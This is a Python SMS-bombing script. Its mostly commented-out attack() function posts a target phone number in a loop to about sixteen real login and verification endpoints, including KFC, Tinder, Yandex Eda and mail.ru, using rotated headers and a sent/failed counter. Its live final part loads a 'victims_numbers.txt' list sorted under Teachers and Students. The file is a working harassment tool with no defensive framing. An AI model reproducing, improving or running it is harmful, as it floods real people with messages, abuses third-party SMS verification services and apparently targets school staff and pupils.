#import random
#import requests
#import datetime
#import sys
#
#
## colours
#green     = '\033[92m'
#cyan      = '\033[95m'
#bold      = '\033[1m'
#underline = '\033[4m'
#end       = '\033[0m'
#red       = '\033[91m'
#
## headers for optimizing sms sent
#with open('.agents','rt') as file:
#    readen = file.read()
#    heads = readen.split('\n')
#    
#           
#def check(sent, sms):
#    if sent  == sms:
#        quit()
#    else:
#        pass
#
#def time(sent , failed):
#    a = datetime.datetime.now()
#    time = (str(a.hour) + ':' + str(a.minute) + ':' +str(a.second))
#    msg1 = f"{green}{bold}{str(time)}{end}"
#    msg2 = f"{green}{bold}{str(sent)}{end} sms sent!"
#    msg3 = f"{green}{bold}{str(failed)}{end} sms failed!"
#    msg4 = f"{green}{bold}{sent}+{failed}{end} sms"
#    if int(sent + failed) < 10000:
#    	sys.stdout.write(f"\r{msg1}         {msg2}     {msg3}")
#    elif int(sent + failed) < 1000:
#    	sys.stdout.write(f"\r{msg1}        {msg2}     {msg3}")
#    elif int(sent + failed) < 100:
#    	sys.stdout.write(f"\r{msg1}       {msg2}     {msg3}")
#    elif int(sent + failed) < 10:
#    	sys.stdout.write(f"\r{msg1}      {msg2}     {msg3}")
#    else:
#        sys.stdout.write(f"\r{msg1}     {msg2}     {msg3}")
#    sys.stdout.flush()
#    	
#
#def attack(mobile,sms,cc):
#    moblie_cc = str(cc) + str(mobile)
#    mobile_pluscc = '+' + str(cc) + str(mobile)
#    sent = 0
#    failed = 0
#    print('-' * 49)
#    print('|     Time     |     Sent      ||    Failed     |')
#    print('-' * 49)
#    while sent <= sms:
#        HEADERS = random.choice(heads)
#        try:
#            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': moblie_cc}, headers=HEADERS)
#            sent += 1
#            time(sent , failed)
#            check(sent,sms)
#        except:
#            failed+=1
#            time(sent , failed)
#            check(sent,sms)
#
#
#        try:
#            requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json = {"phone": moblie_cc}, headers=HEADERS)
#            sent += 1
#            time(sent , failed)
#            check(sent,sms)
#        except:
#            failed+=1
#            time(sent , failed)
#            check(sent,sms)
#
#
#        try:
#            requests.post('https://cloud.mail.ru/api/v2/notify/applink',json = {"phone": mobile_pluscc, "api": 2, "email": "email","x-email": "x-email"}, headers=HEADERS)
#            sent += 1
#            time(sent , failed)
#            check(sent,sms)
#        except:
#            failed+=1
#            time(sent , failed)
#            check(sent,sms)
#
#
#        try:
#            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': mobile_pluscc}, headers=HEADERS)
#            sent += 1
#            time(sent , failed)
#            check(sent,sms)
#        except:
#            failed+=1
#            time(sent , failed)
#            check(sent,sms)
#
#
#        try:
#            requests.post('https://b.utair.ru/api/v1/login/', data = {'login':moblie_cc}, headers=HEADERS)
#            sent += 1
#            time(sent , failed)
#            check(sent,sms)
#        except:
#            failed+=1
#            time(sent , failed)
#            check(sent,sms)
#
#
#        try:
#            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data = {"phone_number":moblie_cc}, headers=HEADERS)
#            sent += 1
#            time(sent , failed)
#            check(sent,sms)
#        except:
#            failed+=1
#            time(sent , failed)
#            check(sent,sms)
#
#
#        try:
#            requests.post('https://www.citilink.ru/registration/confirm/phone/+'+ moblie_cc +'/', headers=HEADERS)
#            sent += 1
#            time(sent , failed)
#            check(sent,sms)
#        except:
#            failed+=1
#            time(sent , failed)
#            check(sent,sms)
#
#
#        try:
#            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data = {"st.r.phone": mobile_pluscc}, headers=HEADERS)
#            sent += 1
#            time(sent , failed)
#            check(sent,sms)
#        except:
#            failed+=1
#            time(sent , failed)
#            check(sent,sms)
#
#
#        try:
#            requests.post('https://app.karusel.ru/api/v1/phone/', data = {"phone":moblie_cc}, headers=HEADERS)
#            sent += 1
#            time(sent , failed)
#            check(sent,sms)
#        except:
#            failed+=1
#            time(sent , failed)
#            check(sent,sms)
#
#
#        try:
#            requests.post('https://youdrive.today/login/web/phone', data = {'phone': mobile, 'phone_code': '7'},headers=HEADERS) #headers = {}, headers=HEADERS)
#            sent += 1
#            time(sent , failed)
#            check(sent,sms)
#        except:
#            failed+=1
#            time(sent , failed)
#            check(sent,sms)
#
#
#        try:
#            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': moblie_cc}, headers=HEADERS)
#            sent += 1
#            time(sent , failed)
#            check(sent,sms)
#        except:
#            failed+=1
#            time(sent , failed)
#            check(sent,sms)
#
#
#        try:
#            requests.post('https://youla.ru/web-api/auth/request_code', json = {"phone":mobile_pluscc}, headers=HEADERS)
#            sent += 1
#            time(sent , failed)
#            check(sent,sms)
#        except:
#            failed+=1
#            time(sent , failed)
#            check(sent,sms)
#
#
#        try:
#            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + moblie_cc}, headers=HEADERS)
#            sent += 1
#            time(sent , failed)
#            check(sent,sms)
#        except:
#            failed+=1
#            time(sent , failed)
#            check(sent,sms)
#
#
#        try:
#            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data= {"phone": moblie_cc}, headers=HEADERS)
#            sent += 1
#            time(sent , failed)
#            check(sent,sms)
#        except:
#            failed+=1
#            time(sent , failed)
#            check(sent,sms)
#
#
#        try:
#            requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": moblie_cc, "SignupForm[device_type]": 3}, headers=HEADERS)
#            sent += 1
#            time(sent , failed)
#            check(sent,sms)
#        except:
#            failed+=1
#            time(sent , failed)
#            check(sent,sms)
#
#
#        try:
#            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': moblie_cc, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"}, headers=HEADERS)
#            sent += 1
#            time(sent , failed)
#            check(sent,sms)
#        except:
#            failed+=1
#            time(sent , failed)
#            check(sent,sms)
file="victims_numbers.txt"
def defaultNum():
    list1 = []
    with open(file,'rt') as victims_lis:

        victim_num_lis = victims_lis.read()

        vic_lis = victim_num_lis.split('/')

        for vic_and_num in vic_lis:

            vic_and_num_lis = vic_and_num.split('\n')

            for name in vic_and_num_lis:

                if (name == 'Teachers') or (name == 'Students') or (name == ''):
                    pass
                else:
                    name = name.replace(' ', '')
#                    numbers[name.split(':')[0]] = name.split(':')[1]
                    list1.append(name.split(':')[1])
    return list1
print(defaultNum())